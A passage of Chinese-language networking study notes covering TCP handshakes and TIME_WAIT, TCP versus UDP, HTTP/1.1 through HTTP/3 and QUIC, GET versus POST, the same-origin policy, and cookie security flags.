  首先客户端(发送方)发送了SYN包请求连接, 但是网络阻塞导致发送的SYN包一直没有抵达服务端, 于是客户端(超时重发)重新发送SYN包请求连接, 服务端接收到SYN包, 返回SYN + ACK包, 至此服务端认为建立一次连接; 一段时间后, 最开始发送的SYN包到达服务端, 服务端也将其当作请求,建立了第二次连接(对于服务端来说), 但是对于客户端(发送方),认为第一次发送的SYN包丢失,才发送的第二次SYN包. 所以对于客户端来说建立了一次连接,而对于服务端来说建立了两次连接.导致建立多次无效冗余链接, 造成资源浪费.

* 安全问题

  我们知道 TCP 新建连接时，内核会为连接分配一系列的内存资源，如果采用两次握手，就建立连接，那会放大 DDOS 攻击的。

### 三次握手后，C端和S端进入数据传输状态

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdj20p76j214f0jrada.jpg)

如果出现数据丢失，接收端可让发送端重发这部分的数据。接收端进行补齐

上述发送与接收过程，**不区分客户端与服务端，TCP连接是全双工**，均采用上述机制

### 四次挥手

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdjqmn58j21f10r8te0.jpg)

客户端与服务端都可以发起关闭连接请求

### （四次挥手）客户端为什么需要进入超时等待时间？（第四次挥手时）

原因一: 

假设如果客户端发送完最后的`ACK`包，就关闭连接，然后`ACK`包在网络中丢失，故服务端没有收到最后确认的`ACK`包，而一直停留在最后确认状态。如果客户端发送完最后一个`ACK包`后，进入一段等待时间，这时服务器会因为没有收到`ACK`包而重发`FIN`包，客户端会响应这个`FIN`包，而重发`ACK`包，并刷新超时时间

原因二: 

TCP设计了一个机制, 经过`2MSL`时间, 足以让两个方向上的`历史数据包`都被丢弃, 使得原来连接的数据包在网络中自然消失, 至此再出现的数据包一定是新建立连接产生的.

### 为什么 TIME_WAIT 等待的时间是 2MSL？

TIME_WAIT 等待 2 倍的 MSL，⽐较合理的解释是： ⽹络中可能存在来⾃发送⽅(例如第三次握手的服务端)的数据包，当这些发送⽅的数据包被接收⽅处理后⼜会向对⽅发送响应，所以⼀来⼀回需要等待 2 倍的时间。

比如服务端没有收到最后的ACK报文, 就会触发超时重发FIN包, 另一方(客户端)接收到FIN包后,会重发ACK包给服务端,这样一来一回就是2个MSL.

### 为什么是四次挥手？

再来回顾下四次挥⼿双⽅发 FIN 包的过程，就能理解为什么需要四次了。
关闭连接时，客户端向服务端发送 FIN 时，仅仅表示客户端不再发送数据了但是还能接收数据。
服务器收到客户端的 FIN 报⽂时，先回⼀个 ACK 应答报⽂，⽽服务端可能还有数据需要处理和发送，等服务端不再发送数据时，才发送 FIN 报⽂给客户端来表示同意现在关闭连接。
从上⾯过程可知，服务端通常需要等待完成数据的发送和处理，所以服务端的 ACK 和 FIN ⼀般都会分开发送，从⽽⽐三次握⼿导致多了⼀次。

## TCP和UDP的区别

1. **TCP是面向连接的，UDP是无连接的**，即发送数据前不需要建立连接
2. **TCP提供可靠的服务。**也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达；UDP尽最大努力交付，即不保证可靠交付。并且因为TCP可靠，面向连接，适合大数据量的交换。
3. **TCP面向字节流，UDP面向报文。**并且网络出现拥塞不会使得发送速率降低（因此会出现丢包，对实时的应用比如IP电话和视频会议等）
4. **TCP只能是1对1的，UDP支持1对1、1对多**
5. TCP的首部较大为20字节，而UDP只有8字节

扩展：

`websocket`的协议是在`TCP/IP`协议簇的==应用层==，和`http`在同一层。
`websocket`是不同于`http`的另一种应用层协议，但`websocket`和`http`都是==基于`TCP`==传输层的。

## WebSocket的实现和应用

1. 什么是WebSocket?

   **WebSocket是HTML5中的协议，支持持久连续**，*而同属于应用层的`HTTP`协议不支持持久性连接。*HTTP1.0不支持持久性的链接，HTTP1.1中的keep-alive，将多个http请求合并为1个

2. WebSocket是什么样的协议，具体有什么优点？

   1. **WebSocket是持久化的协议，相比于HTTP这种非持久的协议来说**
   2. **他可以主动发起请求（和HTTP的只能被客户端请求<被动>）**

   > 简单的举个例子吧，用目前应用比较广泛的PHP生命周期来解释。
   >
   > * HTTP的生命周期通过Request来界定，也就是一个Request 一个Response，那么在HTTP1.0中，这次HTTP请求就结束了。
   >   在HTTP1.1中进行了改进，使得有一个keep-alive，也就是说，在一个HTTP连接中，可以发送多个Request，接收多个Response。
   >   但是请记住 Request量 = Response量 ， 在HTTP中永远是这样，也就是说一个request只能有一个response。而且这个response也是**被动**的，不能主动发起。

## 一个图片url访问后直接下载怎样实现？

### 一般的图片请求

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdkhb4lfj20z70kndk9.jpg)

### 访问后下载的图片请求

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdkwwc3ij20w60lsq7c.jpg)

这种请求的响应头中包含：

> 1. x-oss-object-type:
>
>    Normal
>
> 2. x-oss-request-id:
>
>    598D5ED34F29D01FE2925F41
>
> 3. x-oss-storage-class:
>
>    Standard
>
> 4. 还有其他的请看图中

所以，这样的请求返回的响应头中含有x-oss的参数决定了用户的下载行为！

## 说说 HTTP/1.1 相⽐ HTTP/1.0 提⾼了什么性能？

HTTP/1.1 相⽐ HTTP/1.0 性能上的改进：

* 使⽤ TCP ⻓连接的⽅式改善了 HTTP/1.0 短连接造成的性能开销。

* <mark>⽀持管道（pipeline）⽹络传输，只要第⼀个请求发出去了，不必等其回来，就可以发第⼆个请求出去，可以减少整体的响应时间。</mark>

## 对于 HTTP/1.1 的性能瓶颈，HTTP2.0做了哪些优化？

> HTTP/1.1的性能瓶颈

由于HTTP发展到1.1存在诸多问题，导致需要对其进行升级

1. 队头阻塞：服务器是按请求的顺序响应的，如果服务器响应慢，会招致客户端⼀直请求不到数据，也就是队头阻塞；
2. 请求 / 响应头部（Header）未经压缩就发送，⾸部信息越多延迟越⼤。只能压缩 Body 的部分；
3. 发送冗余的⾸部。每次互相发送相同的⾸部造成的浪费较多；
4. 没有请求优先级控制；
5. 客户端需要主动请求；

> HTTP2.0

HTTP/2 协议是基于 HTTPS 的，所以 HTTP/2 的安全性也是有保障的。

* ### 数据流（解决没有请求优先级控制）

  HTTP/2 的数据包不是按顺序发送的，同⼀个连接⾥⾯连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。

  每个请求或回应的所有数据包，称为⼀个数据流（ Stream ）。每个数据流都标记着⼀个独⼀⽆⼆的编号，其中规定客户端发出的数据流编号为奇数， 服务器发出的数据流编号为偶数

  客户端还可以**指定数据流的优先级**。优先级⾼的请求，服务器就先响应该请求。

  ![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzngn0jtt7j20rp0h7wga.jpg)

* ### 二进制分帧层

  HTTP2性能提升的核心就在于二进制分帧层。HTTP2是二进制协议，他采用二进制格式传输数据而不是1.x的文本格式

  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdlx0wazj20o10cmt9n.jpg)

  在应用层新增一个**二进制分帧层（Binary Framing）**，用来处理所有 HTTP2.0 新增的特性，对于通过 http/2 传输的信息细分为消息和帧，使用二进制格式编码。

  **HTTP1.1请求是文本格式，而2.0把请求划分成了两个帧**，图中的HEADERS frame（头信息帧）和DATA frame（数据帧） 是帧的类型。也就是说一条HTTP请求，划分成了两个帧来传输，并且采用**二进制来编码**。<mark>增加数据传输的效率</mark>

* ### 多路复用（解决队头阻塞）

  HTTP/2 是可以在⼀个连接中<mark>并发</mark>多个请求或回应，⽽不⽤按照顺序⼀⼀对应。

  移除了 HTTP/1.1 中的串⾏请求，不需要排队等待，也就不会再出现「队头阻塞」问题，降低了延迟，⼤幅度提⾼了连接的利⽤率。

  举例来说，在⼀个 TCP 连接⾥，服务器收到了客户端 A 和 B 的两个请求，如果发现 A 处理过程⾮常耗时，于是就回应 A 请求已经处理好的部分，接着回应 B 请求，完成后，再回应 A 请求剩下的部分。

  ![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzngnzhq0xj20h70hyq3n.jpg)

* ### 头部压缩（解决首部冗余和头部未压缩问题）

  HTTP/2 会压缩头（Header）如果你同时发出多个请求，他们的头是⼀样的或是相似的，那么，协议会帮你消除重复的部分。

  这就是所谓的 HPACK 算法：在客户端和服务器同时维护⼀张头信息表，所有字段都会存⼊这个表，⽣成⼀个索引号，以后就不发送同样字段了，只发送索引号，这样就提⾼速度了。

  总结：

  * 采用HPACK压缩格式压缩首部，而非1.0版本中的文本格式（首部未压缩）;维护一份相同的字典，减少一些相同首部字段(例如cookie、user-agent等)的发送

  HTTP2的静态字典是长这个样子的（只截取了部分，[完整表格在这里](https://link.juejin.cn/?target=https%3A%2F%2Fhttpwg.org%2Fspecs%2Frfc7541.html%23static.table.definition "https://httpwg.org/specs/rfc7541.html#static.table.definition")）：

  ![](https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/12/10/16797167fe0328dc~tplv-t2oaga2asx-watermark.awebp)

* ### 服务器端推送（解决只能客户端单向请求问题）

  1. 服务器可以对**一个客户端请求发送多个响应**。有别于 HTTP/1.x 定义的一个请求一个响应。
  2. HTTP/2 下**服务器可以主动推送**内容给客户端，这主要考虑场景是现在的一个网络应用会包含多种资源，可以通过服务器提前推送这些资源，从而减少客户端再次发起资源请求的延迟时间。

  所有服务器推送数据流都是通过 PUSH_PROMISE 帧发起，客户端接受到后可以拒绝、缓存、复用

  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdmm920hj20t009jgme.jpg)

## HTTP/2 有哪些缺陷？HTTP/3 做了哪些优化？

HTTP/2 主要的问题在于，多个 HTTP 请求在复⽤⼀个 TCP 连接，下层的 TCP 协议是不知道有多少个 HTTP 请求的。所以⼀旦发⽣了丢包现象，就会触发 TCP 的重传机制，这样在⼀个 TCP 连接中的所有的 HTTP 请求都必须等待这个丢了的包被重传回来。

* HTTP/1.1 中的管道（ pipeline）传输中如果有⼀个请求阻塞了，那么队列后请求也统统被阻塞住了

* HTTP/2 多个请求复⽤⼀个TCP连接，⼀旦发⽣丢包，就会阻塞住所有的 HTTP 请求。

<mark>这都是基于 TCP 传输层的问题，所以 HTTP/3 把 HTTP 下层的 TCP 协议改成了 UDP！</mark>

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gznqsnxq8aj20lq0a63zc.jpg)

UDP 发⽣是不管顺序，也不管丢包的，所以不会出现 HTTP/1.1 的队头阻塞 和 HTTP/2 的⼀个丢包全部重传问题。

⼤家都知道 UDP 是不可靠传输的，但基于 UDP 的 QUIC 协议 可以实现类似 TCP 的可靠性传输。

* QUIC 有⾃⼰的⼀套机制可以保证传输的可靠性的。当某个流发⽣丢包时，只会阻塞这个流，其他流不会受到影响。

* TLS3 升级成了最新的 1.3 版本，头部压缩算法也升级成了 QPack 。

* HTTPS 要建⽴⼀个连接，要花费 6 次交互，先是建⽴三次握⼿，然后是 TLS/1.3 的三次握⼿。QUIC 直接把以往的 TCP 和 TLS/1.3 的 6 次交互合并成了 3 次，减少了交互次数。

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gznqu38rjsj20km0domy2.jpg)

所以， QUIC 是一个在 UDP 之上的**伪** TCP + TLS + HTTP/2 的多路复用的协议。

QUIC 是新协议，对于很多网络设备，根本不知道什么是 QUIC，只会当做 UDP，这样会出现新的问题。所以 HTTP/3 现在普及的进度非常的缓慢，不知道未来 UDP 是否能够逆袭 TCP。

参考: https://mp.weixin.qq.com/s/bUy220-ect00N4gnO0697A

## GET和POST的区别

> 常规总结

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdhlglocj218l0u0jwl.jpg)

> ==深入总结==

所以从标准上来看，GET 和 POST 的区别如下：

- GET 用于获取信息，是无副作用的，是**幂等**的，且可缓存

- POST 用于修改服务器上的数据，有副作用，**非幂等**，不可缓存

1. ## **GET 和 POST 报文上的区别**

   首先，结论就是**没有实质的区别**，只是报文格式不同。GET方法和POST方法只是HTTP的两种请求方式，而HTTP协议隶属于TCP/IP中的应用层，而他是基于传输层中的TCP协议，故而在传输上，没有区别。

   报文格式上：

   * **不带参数**时，最大区别就是**第一行方法名不同**

     POST方法请求报文第一行是这样的 `POST /uri HTTP/1.1 \r\n`

     GET方法请求报文第一行是这样的 `GET /uri HTTP/1.1 \r\n`

   * **带参数**时，在约定中，GET 方法的参数应该放在 url 中，POST 方法参数应该放在 body 中

   所以，两种方法本质上是 TCP 连接，没有差别，也就是说，如果我不按规范来也是可以的。我们可以在 URL 上写参数，然后方法使用 POST；也可以在 Body 写参数，然后方法使用 GET。当然，这需要服务端支持。

2. ## **GET 方法参数写法是固定的吗？**

   一般来说，我们的参数是写在 `?` 后面，用 `&` 分割。

   我们知道，**解析报文的过程是通过获取 TCP 数据，用正则等工具从数据中获取 Header 和 Body，从而提取参数。**

   也就是说，我们可以自己约定参数的写法，只要服务端能够解释出来就行，一种比较流行的写法是： `http://www.example.com/user/name/chengqm/age/22`。

3. ## **POST 方法比 GET 方法安全？**

   答案是：并不是，因为POST方法和GET方法都是HTTP的两种请求方式，而**HTTP协议本身就是明文传输，并不安全**。我们通常认为GET方法的参数会显示在浏览器URL中，而POST是将参数放在请求body中，所以POST会比GET安全，其实这是错误的，如果使用抓包工具，两种方法的参数都是可以抓取到的。

   要想真正做到安全，就需要使用HTTPS协议（通过SSL建立身份认证和安全传输）

4. ## **GET 方法的长度限制是怎么回事？**

   常规总结中提到，用GET方法，浏览器地址栏输入的参数是有限的，这是错误的说法。

   首先要明白，**HTTP协议没有 Body 和 URL 的长度限制，对 URL 限制的大多是浏览器和服务器的原因。**

   * 浏览器原因是因为GET能被缓存，如果url过于长，会让浏览器存储过大的数据，影响性能

   * 服务器是因为处理长 URL 要消耗比较多的资源，为了性能和安全（防止恶意构造长 URL 来攻击）考虑，会给 URL 长度加限制。

5. ## **POST 方法会产生两个TCP数据包？**

   有些文章中提到，post 会将 header 和 body 分开发送，先发送 header，服务端返回 100 状态码再发送 body。

   HTTP 协议中没有明确说明 POST 会产生两个 TCP 数据包，而且实际测试(Chrome)发现，header 和 body 不会分开发送。

   所以，**header 和 body 分开发送是部分浏览器或框架的请求方法，不属于 post 必然行为。**

链接：[GET和POST的区别](https://zhuanlan.zhihu.com/p/57361216)

> ==最后总结==

1. GET 用于获取数据，POST 用于修改数据
2. GET 能被缓存，POST 不能
3. 无参数时，GET 报文形式和 POST 的区别只是请求行的第一个方法名不同；有参数时，GET 的参数放在 URL 中而 POST 的参数放在 body 请求体中
4. GET 的 URL 长度被限制，是因为 GET 会被浏览器缓存，如果过长 URL 会导致浏览器存储大量数据；POST 的 body 长度也会被限制，是因为过长的 body 数据会加长服务器解析时间，影响服务器性能。 

> 区分 Diff 和 Same

```js
Diff:
  1. get 的参数一般放在url(也可以放在body中), post 放在 body 中
  2. 报文上, get 和 post 请求行显示不同(POST /uri HTTP/1.1 \r\n 和 GET /uri HTTP/1.1 \r\n)
  3. get 会被缓存, 而 post 不会被缓存
  4. get 数据在 url 中可见, post 的数据不会显示在 url 中
  5. get 的数据长度受浏览器限制, post 的数据长度受服务器限制
  6. get 是幂等的, post 是非幂等的
Same:
	1. get 和 post 都是明文传输数据(因为都是http方法), 所以都不安全
```

## 在网站中输入url，都经历了什么过程

具体参看“前端性能与优化”中的内容。

## IP地址和MAC地址的区别

1. **IP地址可改动，MAC地址不可改动**（对于网络中的一些设备，路由器或者是PC及而言，IP地址的设计是出于拓扑设计出来的，只要在不重复IP地址的情况下，它是可以随意更改的；而MAC地址是根据生产厂商烧录好的，它一般不能改动的，一般来说，当一台PC机的网卡坏了之后，更换了网卡之后MAC地址就会变了）
2. IP地址的长度为32位，而MAC地址为48位
3. **它们的寻址协议层不同。IP地址应用于OSI模型的网络层，而MAC地址应用在OSI模型的数据链路层**（数据链路层协议可以使数据从一个节点传递到相同链路的另一个节点上（通过MAC地址），而网络层协议使数据可以从一个网络传递到另一个网络上（ARP根据目的IP地址，找到中间节点的MAC地址，通过中间节点传送，从而最终到达目的网络）
4. 分配依据不同。IP地址的分配是基于我们自身定义的网络拓扑，MAC地址的分配是基于制造商

## **SPDY和WebSocket的关系**

SPDY和WebSocket的关系比较复杂。

1. 补充关系，二者侧重点不同。SPDY更侧重于给Web页面的加载提速，而WebSocket更强调为Web应用提供一种双向的通讯机制以及API。
2. 竞争关系，二者解决的问题有交集，比如在服务器推送上SPDY和WebSocket都提供了方案。
3. 承载关系，试想，如果SPDY的标准化早于WebSocket，WebSocket完全可以侧重于API，利用SPDY的帧机制和多路复用机制实现该API。 Google提出草案，说WebSocket可以跑在SPDY之上。WebSocket的连接建立在SPDY的流之上，将WebSocket的帧映射到SPDY的帧上。
4. 融合关系，如微软在HTTP Speed+Mobility中所做的。

## 跨域产生的原因和解决方法

出于浏览器的同源策略限制。

**所谓同源（即在同一个域）就是两个页面具有相同的协议（protocol）、主机（host）和端口号（port）。**

同源策略（Same Orgin Policy）是一种约定，它是浏览器核心也最基本的安全功能，它会阻止一个域的js脚本和另外一个域的内容进行交互，如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击。

> 解决方法

1. 使用反向代理

2. 设置响应头

3. 通过JSONP

更多内容：[跨域问题](https://blog.moonlet.cn/archives/563)

## Cookie的Secure属性和HttpOnly属性

基于安全的考虑，需要给cookie加上Secure和HttpOnly属性。

* HttpOnly比较好理解，设置HttpOnly=true的cookie不能被js获取到，无法用document.cookie打出cookie的内容，防止劫取Cookie，防止了XSS攻击。

* 设置Secure属性使Cookie只能通过https协议发送。

  ( 如果一个cookie被设置了Secure=true，那么这个cookie只能用https协议发送给服务器，用http协议是不发送的。换句话说，cookie是在https的情况下创建的，而且他的Secure=true，那么之后你一直用https访问其他的页面（比如登录之后点击其他子页面），cookie会被发送到服务器，你无需重新登录就可以跳转到其他页面。但是如果这是你把url改成http协议访问其他页面，你就需要重新登录了，因为这个cookie不能在http协议中发送。)

## Cookie、Session、Token、JWT

技术蛋老师的视频(推荐): https://www.bilibili.com/video/BV1ob4y1Y7Ep?spm_id_from=333.337.search-card.all.click

[傻傻分不清之 Cookie、Session、Token、JWT - 掘金](https://juejin.cn/post/6844904034181070861)

## keep-alive小知识
1. http1.0中不支持长连接
2. http1.1中支持长连接，所以可以在请求标头中看到connection: keep-alive
3. 而http2中取消了该属性，所以网页中基于http2的请求没有connection: keep-alive

tips：不是所有 HTTPS 请求都使用 HTTP/2 协议。如果客户端和服务器都支持 HTTP/2，并且配置启用了 HTTP/2，那么它们就会选择使用 HTTP/2。但是，如果其中一方不支持或者配置禁用了 HTTP/2，那么可能会回退到使用先前的协议，比如 HTTP/1.1